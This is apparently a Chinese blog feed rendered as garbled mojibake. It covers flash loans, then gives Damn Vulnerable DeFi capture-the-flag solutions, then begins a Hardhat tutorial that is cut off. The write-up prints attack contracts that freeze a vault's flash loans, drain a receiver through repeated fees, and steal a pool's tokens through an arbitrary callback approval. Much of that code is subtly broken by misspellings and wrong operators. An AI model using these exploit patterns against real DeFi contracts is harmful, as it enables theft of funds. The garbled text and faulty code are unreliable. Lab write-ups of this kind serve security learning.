å……åˆ†èåˆï¼Œå»ºç«‹ V4 ç‰ˆæœ¬æ‰€è®¾è®¡çš„ Aave Network ï¼Œä»¥åŠæ‹“å±•å…¶éå€Ÿè´·ä¸šåŠ¡ç”Ÿæ€ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é—ªç”µè´·</title>
      <link href="/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/"/>
      <url>/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="é—ªç”µè´·"><a href="#é—ªç”µè´·" class="headerlink" title="é—ªç”µè´·"></a>é—ªç”µè´·</h1><p>é—ªç”µè´·ï¼ˆFlash loanï¼‰ï¼šæ˜¯ä¸€ç§æ— æŠµæŠ¼ã€å€Ÿè´·é‡‘é¢æ— ä¸Šé™ï¼ˆå¯ä»¥å€Ÿå…‰æ± ä¸­æ‰€æœ‰çš„é’±ï¼‰çš„è´·æ¬¾ã€‚å®ƒè¦æ±‚å€Ÿè´·äººå¿«å€Ÿå¿«è¿˜ï¼Œå¿«åˆ°è¿˜æ¬¾å’Œå€Ÿæ¬¾åœ¨åŒä¸€ä¸ªäº¤æ˜“å†…ï¼ˆåŒä¸€ä¸ªä»¥å¤ªåŠ transaction),åœ¨æˆ‘çœ‹æ¥å°±æ˜¯éå¸¸è¿…é€Ÿçš„å€Ÿæ¬¾è¿˜æ¬¾</p><p>é¦–å…ˆä½ è¦å€Ÿé’±çš„è¯ï¼Œä½ è¦å†™ä¸ªè¿˜é’±åˆçº¦ï¼Œé‡Œé¢åŒ…æ‹¬äº†å¦‚ä½•èµšé’±ï¼Œè¿˜æœ¬é‡‘åŠ åˆ©æ¯çš„æ•°ç›®ï¼Œå¼€å§‹å€Ÿæ¬¾çš„è¯ï¼Œå°±è¦å®ç°ä¸€ä¸ªflashloan()é—ªç”µè´·åˆçº¦ï¼Œè¿™ä¸ªåˆçº¦é¦–å…ˆè¦å…ˆè¿›è¡Œä¸€ç³»åˆ—çš„æ•°æ®éªŒè¯ï¼Œå†è°ƒç”¨ä½ çš„è¿˜é’±åˆçº¦ï¼ŒéªŒè¯ä½ æ˜¯å¦è¿˜äº†æœ¬é‡‘åŠ åˆ©æ¯ï¼Œå¦‚æœæ²¡æœ‰è¿˜ä¸Šï¼Œç›´æ¥ revert æ•´ä¸ªäº¤æ˜“ï¼Œè®©å€Ÿæ¬¾æ— æ•ˆï¼Œä»è€Œä¿è¯å€Ÿå‡ºæ–¹æ€»æ˜¯å®‰å…¨çš„ã€‚å®ç°é—ªç”µè´·é€šå¸¸æœ‰ä¿©ä¸ªåˆçº¦ã€‚</p><p>é—ªç”µè´·çš„ä¼˜ç‚¹ï¼šç¼–å†™é—ªç”µè´·åˆçº¦æ€»ä½“å¹¶ä¸å¤æ‚ã€‚ä½¿ç”¨é—ªç”µè´·é£é™©ä¹Ÿæ¯”è¾ƒå°ã€‚å¦‚æœèµšé’±é€»è¾‘å¤±è´¥ï¼Œå˜æˆäº†äºé’±é€»è¾‘ï¼Œä¸èƒ½å®Œæˆè¿˜æ¬¾ï¼Œé‚£ä¹ˆä¹Ÿä¸ç”¨æ‹…å¿ƒå€Ÿæ¥çš„å·¨æ¬¾æ— åŠ›å¿è¿˜ã€‚æ•´ä¸ªäº¤æ˜“å°†ä¼šæ‰§è¡Œå¤±è´¥ï¼Œå°±å¦‚åŒå€Ÿæ¬¾ä»æ¥æ²¡æœ‰å‘ç”Ÿè¿‡ä¸€æ ·ã€‚</p><p><a href="https://www.learnblockchain.cn/article/1926">å®ç°ä½ ç¬¬ä¸€ç¬”é—ªç”µè´·åˆçº¦</a><br><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">é—ªç”µè´·çš„æç®€å…¥é—¨</a><br>ä¸‹é¢æ˜¯AIç”Ÿæˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## é—ªç”µè´·</span><br><span class="line">### åŒä¸€ä¸ªåŒºå—ä¸­ææ¬¾å¯å¯¼è‡´é—ªç”µè´·æ”»å‡»</span><br><span class="line">æ”»å‡»è€…åˆ©ç”¨é—ªç”µè´·çš„ç‰¹æ€§ï¼Œåœ¨åŒä¸€ä¸ªåŒºå—å†…æ‰§è¡Œå¤šä¸ªäº¤æ˜“ï¼Œä»¥è¿…é€Ÿæ“æ§å¸‚åœºï¼Œå¹¶ä»ä¸­è·åˆ©ï¼Œé—ªç”µè´·æœ¬èº«å°±æ˜¯ä¸€ç¬”äº¤æ˜“å®Œæˆçš„ï¼Œå¦‚æœå…è®¸åœ¨åŒä¸€ä¸ªåŒºå—ä¸Šè¿›è¡Œææ¬¾æ“ä½œï¼Œé‚£ä¹ˆå°±æ­£å¥½æ»¡è¶³æ”»å‡»è€…çš„éœ€æ±‚äº†</span><br><span class="line">### é—ªç”µè´·å¯èƒ½ä¼šæ“çºµERC4626</span><br><span class="line">ERC4626ï¼Œå³ä»£å¸åŒ–çš„é‡‘åº“æ ‡å‡†ï¼Œå¦‚æœåº•å±‚æœºåˆ¶æ²¡æœ‰å……åˆ†è€ƒè™‘æ­¤ç±»å¨èƒï¼Œåˆ™å¯èƒ½å®¹æ˜“å—åˆ°é—ªç”µè´·æ”»å‡»ã€‚ä¾‹å¦‚ERC4626æ²¡æœ‰å†…ç½®çš„ä¿æŠ¤åŠŸèƒ½ï¼Œé‚£ä¹ˆé—ªç”µè´·å¯èƒ½åˆ©ç”¨å¿«é€Ÿå†»ç»“æ“ä½œ</span><br><span class="line"></span><br><span class="line">é—ªç”µè´·ï¼ˆFlash Loanï¼‰æ˜¯ä¸€ç§æ–°å…´çš„é‡‘èå·¥å…·ï¼Œå…è®¸ç”¨æˆ·åœ¨ä¸éœ€è¦æŠµæŠ¼ç‰©çš„æƒ…å†µä¸‹å€Ÿå…¥å¤§é‡èµ„é‡‘ï¼Œä½†å¿…é¡»åœ¨åŒä¸€äº¤æ˜“ä¸­å¿è¿˜ã€‚è¿™ç§æœºåˆ¶æœ€åˆç”±å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰å¹³å°å¼•å…¥ï¼Œä¸ºäº¤æ˜“è€…æä¾›äº†çµæ´»æ€§å’Œæœºä¼šã€‚ç„¶è€Œï¼Œé—ªç”µè´·ä¹Ÿå¯èƒ½è¢«åˆ©ç”¨æ¥è¿›è¡Œæ”»å‡»ï¼Œå½¢æˆæ‰€è°“çš„â€œé—ªç”µè´·æ”»å‡»â€ã€‚ä»¥ä¸‹æ˜¯å¯¹é—ªç”µè´·å€Ÿè´·æ¼æ´çš„ç»†åˆ†æè¿°ï¼š</span><br><span class="line">1. é—ªç”µè´·çš„åŸºæœ¬åŸç†</span><br><span class="line"></span><br><span class="line">1.å€Ÿè´·è¿‡ç¨‹ï¼šç”¨æˆ·åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆå¦‚Aaveæˆ– dYdXï¼‰ç”³è¯·å€Ÿæ¬¾ï¼Œå€Ÿæ¬¾ä¸éœ€è¦æŠµæŠ¼ç‰©ï¼Œä½†å¿…é¡»åœ¨åŒä¸€äº¤æ˜“åŒºå—å†…è¿˜æ¬¾ã€‚</span><br><span class="line">2.çŸ­æœŸæ€§ï¼šå€Ÿæ¬¾çš„æ—¶é—´æçŸ­ï¼Œé€šå¸¸åœ¨å‡ ç§’é’Ÿå†…å®Œæˆã€‚</span><br><span class="line">3.åº”ç”¨åœºæ™¯ï¼šå¯ä»¥ç”¨äºå¥—åˆ©ã€æ¸…ç®—å…¶ä»–å€Ÿè´·ã€å¿«é€Ÿäº¤æ˜“ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">2. é—ªç”µè´·æ”»å‡»çš„ç±»å‹</span><br><span class="line">a. å¥—åˆ©æ”»å‡»</span><br><span class="line"></span><br><span class="line">4.æ¦‚å¿µï¼šå€Ÿæ¬¾è€…åˆ©ç”¨ä»·æ ¼å·®å¼‚åœ¨ä¸åŒå¹³å°ä¸Šè¿›è¡Œå¥—åˆ©ã€‚</span><br><span class="line">5.ç¤ºä¾‹ï¼šæ”»å‡»è€…åœ¨ä¸€ä¸ªäº¤æ˜“æ‰€ä½ä»·è´­ä¹°èµ„äº§ï¼Œç„¶ååœ¨å¦ä¸€ä¸ªäº¤æ˜“æ‰€é«˜ä»·å‡ºå”®ï¼Œä»¥æ­¤è·å–åˆ©æ¶¦ã€‚</span><br><span class="line"></span><br><span class="line">b. ä»·æ ¼æ“æ§</span><br><span class="line"></span><br><span class="line">6.æ¦‚å¿µï¼šæ”»å‡»è€…åˆ©ç”¨é—ªç”µè´·å¤§é‡å€Ÿå…¥èµ„äº§å¹¶ç¬é—´ä¹°å…¥æˆ–å–å‡ºï¼Œæ“çºµå¸‚åœºä»·æ ¼ã€‚</span><br><span class="line">7.ç¤ºä¾‹ï¼šé€šè¿‡å¤§è§„æ¨¡è´­ä¹°æŸç§ä»£å¸æ¨é«˜å…¶ä»·æ ¼ï¼Œç„¶ååœ¨é«˜ä»·ä½å‡ºå”®æ‰€æŒä»£å¸ï¼Œå¯¼è‡´ä»·æ ¼å›è½ï¼Œå½¢æˆåˆ©æ¶¦ã€‚</span><br><span class="line"></span><br><span class="line">c. æ¸…ç®—æ”»å‡»</span><br><span class="line"></span><br><span class="line">8.æ¦‚å¿µï¼šå€Ÿæ¬¾è€…åœ¨å»ä¸­å¿ƒåŒ–å€Ÿè´·å¹³å°ä¸Šåˆ©ç”¨é—ªç”µè´·æ¸…ç®—å…¶ä»–ç”¨æˆ·çš„æŠµæŠ¼èµ„äº§ã€‚</span><br><span class="line">9.ç¤ºä¾‹ï¼šå½“æŸä¸ªç”¨æˆ·çš„æŠµæŠ¼ç‰©ä»·å€¼é™ä½åˆ°ä¸€å®šç¨‹åº¦ï¼Œæ”»å‡»è€…å¯ä»¥å€Ÿå…¥èµ„é‡‘æ¸…ç®—è¯¥ç”¨æˆ·çš„æŠµæŠ¼ç‰©ï¼Œä»¥è·å¾—æŠ˜æ‰£èµ„äº§ã€‚</span><br><span class="line"></span><br><span class="line">3. é—ªç”µè´·æ¼æ´çš„æˆå› </span><br><span class="line">a. ç¼ºä¹æŠµæŠ¼è¦æ±‚</span><br><span class="line"></span><br><span class="line">10.é—®é¢˜ï¼šç”±äºä¸éœ€è¦æŠµæŠ¼ç‰©ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨çŸ­æ—¶é—´å†…å€Ÿå…¥å¤§é‡èµ„é‡‘ã€‚</span><br><span class="line">11.åæœï¼šä½¿å¾—å¹³å°çš„é£é™©ç®¡ç†æœºåˆ¶å—åˆ°æŒ‘æˆ˜ã€‚</span><br><span class="line"></span><br><span class="line">b. å¸‚åœºä»·æ ¼ä¸ç¨³å®š</span><br><span class="line"></span><br><span class="line">12.é—®é¢˜ï¼šå»ä¸­å¿ƒåŒ–å¸‚åœºçš„æµåŠ¨æ€§å’Œä»·æ ¼ç¨³å®šæ€§è¾ƒå·®ï¼Œå®¹æ˜“å—åˆ°æ“æ§ã€‚</span><br><span class="line">13.åæœï¼šå¯¼è‡´ä»·æ ¼ç¬é—´æ³¢åŠ¨ï¼Œä»è€Œä¸ºå¥—åˆ©æä¾›æœºä¼šã€‚</span><br><span class="line"></span><br><span class="line">c. æ™ºèƒ½åˆçº¦æ¼æ´</span><br><span class="line"></span><br><span class="line">14.é—®é¢˜ï¼šæ™ºèƒ½åˆçº¦å¯èƒ½å­˜åœ¨ä»£ç ç¼ºé™·æˆ–å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›ç¼ºé™·æ‰§è¡Œæ¶æ„æ“ä½œã€‚</span><br><span class="line">15.åæœï¼šå¯èƒ½å¯¼è‡´èµ„äº§æŸå¤±æˆ–åè®®å¤±æ•ˆã€‚</span><br><span class="line"></span><br><span class="line">4. é˜²èŒƒæªæ–½</span><br><span class="line"></span><br><span class="line">16.å®¡è®¡æ™ºèƒ½åˆçº¦ï¼šå®šæœŸè¿›è¡Œä»£ç å®¡è®¡ï¼Œä»¥å‘ç°å’Œä¿®å¤æ½œåœ¨æ¼æ´ã€‚</span><br><span class="line">17.æµåŠ¨æ€§ç®¡ç†ï¼šåŠ å¼ºå¸‚åœºæµåŠ¨æ€§ç®¡ç†ï¼Œé¿å…ä»·æ ¼å‰§çƒˆæ³¢åŠ¨ã€‚</span><br><span class="line">18.å¢åŠ æŠµæŠ¼è¦æ±‚ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè€ƒè™‘å¢åŠ æœ€ä½æŠµæŠ¼è¦æ±‚ï¼Œä»¥é™ä½é£é™©ã€‚</span><br><span class="line"></span><br><span class="line">5. æ€»ç»“</span><br><span class="line">é—ªç”µè´·ä¸ºDeFiç”Ÿæ€ç³»ç»Ÿå¸¦æ¥äº†æ–°çš„æœºé‡ï¼Œä½†ä¹Ÿä¼´éšç€ç›¸åº”çš„é£é™©ã€‚äº†è§£é—ªç”µè´·çš„æœºåˆ¶å’Œæ½œåœ¨æ”»å‡»æ–¹å¼ï¼Œå¯¹äºç”¨æˆ·å’Œå¼€å‘è€…è€Œè¨€ï¼Œéƒ½æ˜¯è‡³å…³é‡è¦çš„ã€‚é€šè¿‡åˆç†çš„é£é™©æ§åˆ¶æªæ–½ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡è½»é—ªç”µè´·å¸¦æ¥çš„å®‰å…¨éšæ‚£ã€‚</span><br></pre></td></tr></table></figure><h3 id="ç”¨æˆ·å¤„äºæ— æ³•è¿˜æ¸…è´·æ¬¾çŠ¶æ€"><a href="#ç”¨æˆ·å¤„äºæ— æ³•è¿˜æ¸…è´·æ¬¾çŠ¶æ€" class="headerlink" title="ç”¨æˆ·å¤„äºæ— æ³•è¿˜æ¸…è´·æ¬¾çŠ¶æ€"></a>ç”¨æˆ·å¤„äºæ— æ³•è¿˜æ¸…è´·æ¬¾çŠ¶æ€</h3><p>æŸäº›æƒ…å†µæˆ–æ¡ä»¶å¯èƒ½ä¼šé˜»æ­¢ç”¨æˆ·å¿è¿˜è´·æ¬¾ï¼Œä»è€Œå¯¼è‡´ä»–ä»¬æ°¸è¿œè´Ÿå€ºç´¯ç´¯ã€‚è¿™å¯èƒ½æ˜¯ç”±äºè¿‡åº¦æŠµæŠ¼ã€é«˜é¢è´¹ç”¨ã€ä»£å¸ä»·å€¼æ³¢åŠ¨æˆ–å…¶ä»–ä¸å¯é¢„è§çš„äº‹ä»¶ç­‰å› ç´ é€ æˆçš„ã€‚</p><h3 id="å€Ÿå‡ºå€Ÿå…¥ç›¸åŒçš„ä»£å¸"><a href="#å€Ÿå‡ºå€Ÿå…¥ç›¸åŒçš„ä»£å¸" class="headerlink" title="å€Ÿå‡ºå€Ÿå…¥ç›¸åŒçš„ä»£å¸"></a>å€Ÿå‡ºå€Ÿå…¥ç›¸åŒçš„ä»£å¸</h3><p>å…è®¸åœ¨å•ç¬”äº¤æ˜“ä¸­å€Ÿå‡ºå’Œå€Ÿå…¥ç›¸åŒä»£å¸çš„åè®®å¯èƒ½å®¹æ˜“å—åˆ°åˆ©ç”¨å¿«é€Ÿä»·æ ¼é€šèƒ€æˆ–é—ªç”µè´·æ¥æ“çºµç³»ç»Ÿçš„æ”»å‡»ã€‚</p><h3 id="è‡ªæˆ‘æ¸…ç®—"><a href="#è‡ªæˆ‘æ¸…ç®—" class="headerlink" title="è‡ªæˆ‘æ¸…ç®—"></a>è‡ªæˆ‘æ¸…ç®—</h3><p>1ï¼Œè‡ªæˆ‘æ¸…ç®—çš„åˆ©æ¶¦æ¼æ´å¯èƒ½å¯¼è‡´æ½œåœ¨çš„ç³»ç»Ÿæ»¥ç”¨å’Œæ„æƒ³ä¸åˆ°çš„è´¢åŠ¡åæœã€‚<br>2ï¼Œå¦‚æœæš‚åœæ¸…ç®—ï¼Œä¼šå¢åŠ å¿ä»˜èƒ½åŠ›é£é™©ï¼Œå¹¶å¯¼è‡´å¤ç‰Œåå‡ºç°ä¸å¯é¢„æµ‹çš„è¡Œä¸ºã€‚<br>3ï¼Œå¯èƒ½å­˜åœ¨æ¸…ç®—äººåšé“çš„é‡‘é¢ä½äºé¢„æœŸæƒ…å†µï¼Œå½±å“ç³»ç»Ÿçš„ç¨³å®šæ€§</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºæœ¬çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>damn-vulnerable-defié¢˜è§£</title>
      <link href="/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-vulnerable-defi"><a href="#Damn-vulnerable-defi" class="headerlink" title="Damn-vulnerable-defi"></a><a href="https://www.damnvulnerabledefi.xyz/">Damn-vulnerable-defi</a></h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>è¦æ±‚æ˜¯ï¼Œä½¿æ‹¥æœ‰ä¸€ç™¾ä¸‡DVIçš„é’±åŒ…åœæ­¢é—ªç”µè´·çš„åŠŸèƒ½</p><p>åˆ†æï¼šè¿™ä¸ªåˆçº¦çš„ä»£ç åœ¨gittubä¸Šï¼Œè¦åˆ†å¼€å»çœ‹ï¼Œè¿™é“é¢˜çš„è§£å†³å°±æ˜¯é ä¸€ä¸ªåŸºæœ¬çš„é—ªç”µè´·çš„çŸ¥è¯†<br>é¦–å…ˆè¦çœ‹é—ªç”µè´·çš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)</span><br><span class="line">       external</span><br><span class="line">       returns (bool)</span><br><span class="line">   &#123;</span><br><span class="line">       if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">       if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">       uint256 balanceBefore = totalAssets();</span><br><span class="line">       if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line"></span><br><span class="line">       // transfer tokens out + execute callback on receiver</span><br><span class="line">       ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line"></span><br><span class="line">       // callback must return magic value, otherwise assume it failed</span><br><span class="line">       uint256 fee = flashFee(_token, amount);</span><br><span class="line">       if (</span><br><span class="line">           receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)</span><br><span class="line">               != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">       ) &#123;</span><br><span class="line">           revert CallbackFailed();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">       ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);</span><br><span class="line">       ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>revertçš„å…³é”®ï¼š  <code>convertToShares(totalSupply) != balanceBefore</code>ï¼Œé¦–å…ˆæ¥çœ‹è¿™ä¸ªtotalSupply,å¾ˆç†Ÿæ‚‰ï¼Œåœ¨ERC20ä¸­è§è¿‡ï¼Œåˆæ•´ä½“çœ‹è¿™ä¸ªåˆçº¦ï¼Œå…¶å®æ˜¯ç»§æ‰¿äº†ERC20ï¼ŒtotalSupplyåœ¨ERC4626ä¸­å®šä¹‰äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC4626éƒ¨åˆ†åˆçº¦</span><br><span class="line"></span><br><span class="line">function convertToShares(uint assets) public view virtual returns (uint256)&#123;</span><br><span class="line">    uint256 supply = totalSupply;</span><br><span class="line">    return supply = 0 ? assets : assets.mulDivDown(supply,talalAssets());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>totalAssets()ï¼šè®¡ç®—çš„æ˜¯å½“å‰é‡‘åº“ä¸­çš„èµ„äº§ä»£å¸æ•°ç›®</li><li>convertToShares(totalSupply)ï¼štotalSupply æ˜¯æ€»çš„ share ä»£å¸æ•°ç›®ï¼ˆåªæœ‰ deposit æˆ– mint æ—¶æ‰ä¼šäº§ç”Ÿï¼‰ï¼ŒconvertToShares å°±æ˜¯è®¡ç®—ï¼šassets * totalSupply &#x2F;totalAssets ()</li></ul><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ° supply&#x3D;assets*supply&#x2F;talalAssets(),å¦‚æœæˆ‘ä»¬è®©talalAssets()æ€»æ•°å¢åŠ ï¼Œè€Œassetsä¸å˜ï¼Œå°±èƒ½æ»¡è¶³convertToShares(totalSupply) !&#x3D; balanceBeforeï¼Œæ‰€ä»¥å°±åªè¦ä¸é€šè¿‡ depost æˆ– mint æ–¹æ³•å‘ UnstoppableVault ä¸­è½¬å…¥ token å³å¯</p><p>æ–¹æ³•ï¼šåœ¨<strong>Unstoppable.t.sol</strong>æµ‹è¯•åˆçº¦ä¸­å†™æˆ‘ä»¬çš„æ”»å‡»åˆçº¦,è®°å¾—æ‰¾å¯¹ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * CODE YOUR SOLUTION HERE</span><br><span class="line"> */</span><br><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    vm.startPrank(player);</span><br><span class="line">    taken.transfer(address(vault),1) </span><br><span class="line">    vm.stopPrank();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p>è¦æ±‚æ˜¯ï¼Œæç©ºä¸€ä¸ªç”¨æˆ·å·²ç»éƒ¨ç½²çš„åˆçº¦ä¸Šçš„ETH</p><p>åˆ†æï¼Œéƒ¨ç½²åˆçº¦ï¼Œpoolçš„é—ªç”µè´·æ‰‹ç»­è´¹ä¸º1eth,receiverå·²ç»æœ‰äº†10eth,è¦ä½¿ receiver ä¸­çš„ä½™é¢ä¸º 0ï¼Œpool ä¸­çš„ä½™é¢ä¸º 1000+10ethï¼Œå°±æ˜¯å› æ­¤åªéœ€é€šè¿‡ receiver å‘ pool æ‰§è¡Œåæ¬¡é—ªç”µè´·å³å¯æŠŠ 10eth å…¨éƒ¨é€šè¿‡æ‰‹ç»­è´¹çš„æ–¹å¼è½¬ç»™ pool</p><p>æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    constructor(address payable _pool, address payable _receiver)&#123;</span><br><span class="line">        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);</span><br><span class="line">        for(uint256 i=0; i&lt;10; i++)&#123;</span><br><span class="line">            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>è¦æ±‚æ˜¯ï¼Œè·å–è¿™ä¸ªæ± ä¸­çš„å…¨éƒ¨DIV</p><p>åˆ†æï¼šçœ‹æ•´ä¸ªåˆçº¦ï¼Œè¿˜æ˜¯æŒºç®€å•çš„ï¼Œä¹Ÿæ˜“è¯»æ˜“æ‡‚ï¼ŒflashLoanåˆçº¦ä¸­ï¼Œå®ç°äº†ç®€å•çš„åˆçº¦ä»£ç ï¼Œæ‰§è¡Œå›è°ƒçš„å‡½æ•°å°±æ˜¯ target.functionCall(data);ä¸»è¦ä»è¿™ä¸ªå…¥æ‰‹ï¼Œæ”»å‡»åˆçº¦å¦‚ä¸‹ï¼š</p><pre><code>pragam solidityb ^0.8.0;import&quot;./TusterLenderPool.sol&quot;;import&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;interface ITusterLenderPool&#123;    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data);&#125;contract TusterExploit&#123;   ITusterlenerPool cons;   address pool;   uint256 balanceof;   address tokenaddress;   constractor (address _pool,address _tokenaddress,uint256 Balanceof)   &#123;    cons = ITusterLenderPool(_pool);    pool = _pool;    tokenaddress = _tokenaddress;    balanceof = Balanceof;   &#125;   function hack() public &#123;    cons.flashLoan(0,msg.sender,tokenaddress,abi.codeWithSigner(&quot;appove(address,uint256)&quot;,address(this),balanceof));    IERC20 token  = IERC20(tokenaddress);    token.transferFrom(pool,msg.sender,balanceof);   &#125;&#125;pragma solidity ^0.8.0;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> é¢˜è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hardhat</title>
      <link href="/2024/08/06/hardhat/"/>
      <url>/2024/08/06/hardhat/</url>
      
        <content type="html"><![CDATA[<h1 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h1><p><strong>hardhat</strong>å°±æ˜¯ä»¥å¤ªåŠå¼€å‘ç¯å¢ƒï¼Œå¦‚åŒremix,ç°åœ¨ä»‹ç»ä¸€ä¸‹å®‰è£…<strong>hardhat</strong>çš„æ­¥éª¤</p><ul><li>æ‰“å¼€ç»ˆç«¯ï¼Œwin+r,è¾“å…¥cmd</li><li>æ£€æŸ¥node js,å®‰è£…æ²¡æœ‰ï¼Œ<code>node -v</code> (æ²¡æœ‰å®‰è£…å»å®˜ç½‘ä¸‹è½½)</li><li>å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåœ¨ç»ˆç«¯è¾“å…¥<code>mkdir hardhat-tutorial</code>ï¼Œç„¶åè¿›å…¥æ–‡ä»¶å¤¹ï¼Œ<code>cd hardhat-tutorial</code></li><li>è¿›è¡Œåˆå§‹åŒ–ï¼Œ<code>npm init</code>ï¼Œæ¥ä¸‹æ¥ä¸€ç›´æŒ‰enter,ç›´åˆ°å‡ºç°<code>Is this OK? (yes)</code>,å›ç­”yeså³å¯</li><li>å®‰è£…<strong>hardhat</strong> <code>npm install --save-dev hardhat</code>,éœ€è¦ç­‰å¾…å‡ ç§’</li><li>å†å®‰è£…ä¸€ä¸ªæ’ä»¶ npm install â€“save-dev @nomicfoundation&#x2F;hardh<br>at-toolbox<br>s</li></ul><h2 id="ç¼–å†™åˆåŒ"><a href="#ç¼–å†™åˆåŒ" class="headerlink" title="ç¼–å†™åˆåŒ"></a>ç¼–å†™åˆåŒ</h2><p>å®‰è£…å®Œæˆåï¼Œå› ä¸ºä½¿ç”¨VScode,æ‰€ä»¥æˆ‘ä»¬è¦å®‰è£…ä¸€ä¸ªVScode å®‰å…¨å¸½ï¼Œå®ƒå¯ä»¥å¸®ç»„æˆ‘ä»¬æ›´å¥½çš„ä½¿ç”¨solidityè¯­è¨€ï¼Œç„¶ååœ¨VScodeåˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œå†™ä¸€ä¸ªç®€å•çš„.solåˆçº¦ï¼Œåœ¨ç»ˆç«¯ä¸­è¿è¡Œè¯¥åˆçº¦ï¼Œ<code>npx hardhat compile,</code>æˆåŠŸåå°±ä¼šçœ‹åˆ°<code>Compiled 1 Solidity file successfully (evm target: paris).</code></p><h2 id="æµ‹è¯•åˆçº¦"><a href="#æµ‹è¯•åˆçº¦" class="headerlink" title="æµ‹è¯•åˆçº¦"></a>æµ‹è¯•åˆçº¦</h2><p><code>npx hardhat test</code>,å¦‚æœä½ æƒ³çœ‹åˆ°solidityçš„æ—¥å¿—æ¶ˆæ¯ï¼Œåˆçº¦å˜é‡ï¼Œå¿…é¡»å¯¼å…¥<code>hardhat/console.sol</code>åˆçº¦ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ·»åŠ ä¸€äº›å¯¹è¯¥å‡½æ•°console.logçš„è°ƒç”¨transfer()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Not enough tokens&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(</span><br><span class="line">        &quot;Transferring from %s to %s %s tokens&quot;,</span><br><span class="line">        msg.sender,</span><br><span class="line">        to,</span><br><span class="line">        amount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] 